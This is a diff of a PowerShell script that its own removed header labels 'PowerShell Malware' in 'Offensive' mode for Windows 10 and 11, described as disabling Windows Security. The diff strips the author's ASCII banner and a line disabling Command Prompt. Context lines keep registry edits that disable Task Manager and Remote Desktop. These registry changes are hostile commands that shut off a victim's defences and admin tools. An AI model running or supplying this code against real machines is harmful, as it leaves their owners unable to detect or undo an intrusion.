@@ -1,17 +1,3 @@
-# |‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|
-# |                                    |   ___                         _         ____    _                          |
-# | Title        : Fuck WinSecurity    |  |_ _|   __ _   _ __ ___     (_)  ___  |  _ \  (_)   __ _   _   _    ___   |
-# | Author       : root@isPique:~$     |   | |   / _` | | '_ ` _ \    | | / __| | |_) | | |  / _` | | | | |  / _ \  |
-# | Version      : 2.0                 |   | |  | (_| | | | | | | |   | | \__ \ |  __/  | | | (_| | | | | | |  __/  |
-# | Category     : PowerShell Malware  |  |___|  \__,_| |_| |_| |_|   |_| |___/ |_|     |_|  \__, |  \__,_|  \___|  |
-# | Target       : Windows 10 - 11     |                                                        |_|                 |
-# | Mode         : Offensive           |                                                                            |
-# |                                    |     My crime is that of curiosity                         |\__/,|   (`\    |
-# | Socials:                           |      and yea curiosity killed the cat                     |_ _  |.--.) )   |
-# | https://github.com/isPique         |       but satisfaction brought him back                   ( T   )     /    |
-# | https://instagram.com/omrefarukk   |                                                          (((^_(((/(((_/    |
-# |____________________________________|____________________________________________________________________________|
-
 <#
 .SYNOPSIS
     This script is designed to disable Window Security.
@@ -419,9 +405,6 @@ Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\srservice"
 
 # Disable Task Manager
 Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"DisableTaskMgr" = 1}
-
-# Disable Command Prompt
-Set-RegistryProperties -path "HKCU:\Software\Policies\Microsoft\Windows\System" -properties @{"DisableCMD" = 1}
 
 # Disable Remote Desktop Connections
 Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -properties @{"fDenyTSConnections" = 1}
